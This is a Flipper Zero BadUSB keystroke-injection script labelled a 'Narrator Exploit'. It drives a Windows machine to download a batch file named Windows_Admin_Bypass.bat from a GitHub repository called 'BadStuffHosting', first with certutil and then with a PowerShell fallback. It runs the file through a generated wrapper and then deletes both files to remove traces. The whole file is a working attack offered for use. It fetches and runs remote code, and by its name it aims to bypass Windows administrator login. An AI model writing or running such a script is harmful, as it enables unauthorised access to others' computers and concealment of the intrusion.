REM ================================================================
REM Flipper Zero BadUSB - Narrator Exploit (Multi-method + Simple Cleanup)
REM ================================================================

DELAY 2000
STRING cls
ENTER
DELAY 300

STRING echo [*] Attempting download method 1: certutil...
ENTER
DELAY 300

REM Try certutil first
STRING certutil -urlcache -split -f "https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/refs/heads/main/Windows/AdminBypassNoLogin/Windows_Admin_Bypass.bat" C:\exploit.bat >nul 2>&1
ENTER
DELAY 5000

REM Check if it worked
STRING if exist C:\exploit.bat goto :execute
ENTER
DELAY 300

REM If certutil failed, try PowerShell
STRING echo [!] certutil failed, trying PowerShell...
ENTER
DELAY 300

STRING powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/refs/heads/main/Windows/AdminBypassNoLogin/Windows_Admin_Bypass.bat' -OutFile 'C:\exploit.bat'" >nul 2>&1
ENTER
DELAY 5000

REM Check again
STRING if exist C:\exploit.bat goto :execute
ENTER
DELAY 300

REM If both failed
STRING echo [-] ERROR: All download methods failed
ENTER
DELAY 300
STRING echo [!] Check internet connection or download manually
ENTER
DELAY 300
STRING pause
ENTER
STRING exit
ENTER
DELAY 500

REM Execution label
STRING :execute
ENTER
DELAY 100
STRING echo [+] Download successful
ENTER
DELAY 300
STRING echo [*] Executing exploit...
ENTER
DELAY 500

REM Create simple cleanup wrapper
STRING echo @echo off > C:\run.bat
ENTER
DELAY 100
STRING echo call C:\exploit.bat >> C:\run.bat
ENTER
DELAY 100
STRING echo del /f /q C:\exploit.bat 2^>nul >> C:\run.bat
ENTER
DELAY 100
STRING echo del /f /q "%~f0" 2^>nul >> C:\run.bat
ENTER
DELAY 100

REM Execute the wrapper
STRING C:\run.bat
ENTER
